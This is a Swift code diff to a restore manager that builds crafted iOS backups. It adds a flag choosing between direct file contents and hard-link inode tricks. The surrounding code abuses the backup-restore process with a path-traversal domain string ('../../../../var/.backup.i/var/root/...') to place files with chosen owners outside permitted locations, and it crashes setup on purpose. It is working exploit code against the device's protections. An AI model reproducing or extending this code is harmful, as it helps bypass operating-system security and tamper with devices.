@@ -12,6 +12,7 @@ struct FileToRestore {
     let path: String
     var owner: Int32 = 501
     var group: Int32 = 501
+    var usesInodes: Bool = true
 }
 
 class RestoreManager {
@@ -126,13 +127,15 @@ class RestoreManager {
             
             // create the inode links
             for (index, file) in sortedFiles.enumerated() {
-                backupFiles.append(ConcreteFile(
-                    path: "Library/Preferences/temp\(index)",
-                    domain: "RootDomain",
-                    contents: file.contents,
-                    owner: file.owner,
-                    group: file.group,
-                    inode: UInt64(index)))
+                if file.usesInodes {
+                    backupFiles.append(ConcreteFile(
+                        path: "Library/Preferences/temp\(index)",
+                        domain: "RootDomain",
+                        contents: file.contents,
+                        owner: file.owner,
+                        group: file.group,
+                        inode: UInt64(index)))
+                }
             }
             
             // add the domains and files
@@ -144,22 +147,24 @@ class RestoreManager {
                 // for non exploit domains, the path will not start with /
                 if file.path.starts(with: "/") {
                     // file utilizes exploit
-                    addExploitedConcreteFile(list: &backupFiles, path: file.path, contents: Data(), owner: file.owner, group: file.group, inode: UInt64(index))
+                    addExploitedConcreteFile(list: &backupFiles, path: file.path, contents: file.usesInodes ? Data() : file.contents, owner: file.owner, group: file.group, inode: file.usesInodes ? UInt64(index) : nil)
                 } else {
                     // file is a regular domain, does not utilize exploit
                     exploit_only = false
-                    addRegularConcreteFile(list: &backupFiles, path: file.path, contents: Data(), owner: file.owner, group: file.group, inode: UInt64(index), last_path: &last_path, last_domain: &last_domain)
+                    addRegularConcreteFile(list: &backupFiles, path: file.path, contents: file.usesInodes ? Data() : file.contents, owner: file.owner, group: file.group, inode: file.usesInodes ? UInt64(index) : nil, last_path: &last_path, last_domain: &last_domain)
                 }
             }
             
             // break the hard links
             for (index, file) in sortedFiles.enumerated() {
-                backupFiles.append(ConcreteFile(
-                    path: "",
-                    domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp\(index)",
-                    contents: Data(),
-                    owner: 501,
-                    group: 501))
+                if file.usesInodes {
+                    backupFiles.append(ConcreteFile(
+                        path: "",
+                        domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp\(index)",
+                        contents: Data(),
+                        owner: 501,
+                        group: 501))
+                }
             }
             
             // crash on purpose to skip setup (only works with exploit files)
